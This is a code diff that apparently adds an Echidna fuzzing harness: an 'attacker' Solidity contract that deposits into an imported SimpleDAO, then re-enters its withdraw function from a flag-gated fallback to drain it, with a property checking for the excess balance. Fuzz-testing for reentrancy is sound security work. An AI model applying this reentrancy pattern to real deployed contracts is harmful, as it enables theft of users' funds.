@@ -1,44 +1,39 @@
+import "./SimpleDAO.sol";
 
-contract a{
-    uint256 _amount = 1 ether;
-    
-    constructor() public payable{
-        
-    }
-    
-    function retBal() public returns(uint256){
-        return address(this).balance;
-    }
-    
-    function transact(address _a) public{
-        _a.call.value(_amount)();
-    }
-}
 
-contract b{
-    
-//    uint256 _am = 0 ether;
-    a _theContract = new a();
+contract attacker{
+
+    SimpleDAO DAO = new SimpleDAO();
+    address a = address(DAO);
 	bool flag = false;
-    
-    function() public payable{
-		if(flag)					anotherTransfer();
-    }
-    
-	function set0(int val, int val2) public{
-    		if (val % 10 == 0 && (val2 % 5) >= 3) 	flag=true;
-  	}
+	uint256 etherAmount = 1 ether;
+	uint256 lastBalance = 0;	
 
-	function anotherTransfer() public returns(uint256){
-        _theContract.transact(address(this));
-    }
 
-	function echidna_shouldFailWhenBalIsZero() public returns(bool){
-		if(address(_theContract).balance > 0)			return true;
-		else									return false;
+	constructor() public payable{
+        depositAll();
 	}
-       
+	
+    function set2(int val1, int val2) public returns(bool){
+	    if(val1+val2<=10) flag=true;
+    }
+    
+	function depositAll() private{
+		DAO.deposit(address(this).balance);
+		address(DAO).transfer(address(this).balance);
+	}
+	
+	function takeEther() public{
+		lastBalance = address(this).balance;
+	    DAO.withdraw(etherAmount);
+	}
+	
+	function() public payable{
+	  if(flag)       DAO.withdraw(DAO.retbalance());
+	}
+
+	function echidna_test() public returns (bool) {
+		if((lastBalance + etherAmount) < address(this).balance)	return false;
+	}
+	
 }
-
-
-
